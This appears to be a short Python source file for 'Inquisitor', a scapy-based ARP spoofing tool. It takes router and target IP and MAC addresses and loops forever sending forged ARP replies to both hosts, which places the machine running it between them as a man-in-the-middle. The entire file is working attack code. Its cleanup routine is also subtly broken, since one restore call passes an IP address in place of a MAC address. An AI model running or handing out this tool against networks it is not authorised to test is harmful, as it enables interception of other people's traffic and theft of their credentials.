import argparse;
# from scapy.layers.l2 import ARP
from scapy import all as scapy


class Inquisitor:
    ip_router = ""
    mac_router = ""
    ip_target = ""
    mac_target = ""

    def __init__(self, args):
        self.ip_router = args.IP_src;
        self.mac_router = args.MAC_src;
        self.ip_target = args.IP_target;
        self.mac_target = args.MAC_target;

    def spoof_arp(self, target_ip, target_mac, source_ip):
        spoofed = scapy.ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
        scapy.send(spoofed, verbose=False)

    def restorearp(self, target_ip, target_mac, source_ip, source_mac):
        packet= scapy.ARP(op=2 , hwsrc=source_mac , psrc= source_ip, hwdst= target_mac , pdst= target_ip)
        scapy.send(packet, verbose=False)

def init_args():
    parser = argparse.ArgumentParser(
                    prog='Inquisitor',
                    description='A program that perform an ARP spoofing',
                    epilog='Made with <3 by hrecolet')
    parser.add_argument('IP_src', type=str)
    parser.add_argument('MAC_src', type=str)
    parser.add_argument('IP_target', type=str)
    parser.add_argument('MAC_target', type=str)
    args = parser.parse_args()
    return args

def exec():
    args = init_args();
    inquisitor = Inquisitor(args)
    try:
        print("Sending spoofed ARP response");
        while True:
            inquisitor.spoof_arp(inquisitor.ip_target, inquisitor.mac_target, inquisitor.ip_router);
            inquisitor.spoof_arp(inquisitor.ip_router, inquisitor.mac_router, inquisitor.ip_target);
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        inquisitor.restorearp(inquisitor.ip_router, inquisitor.ip_router, inquisitor.ip_target, inquisitor.mac_target)
        inquisitor.restorearp(inquisitor.ip_target, inquisitor.mac_target, inquisitor.ip_router, inquisitor.mac_router)
        exit()


if __name__ == '__main__':
    exec()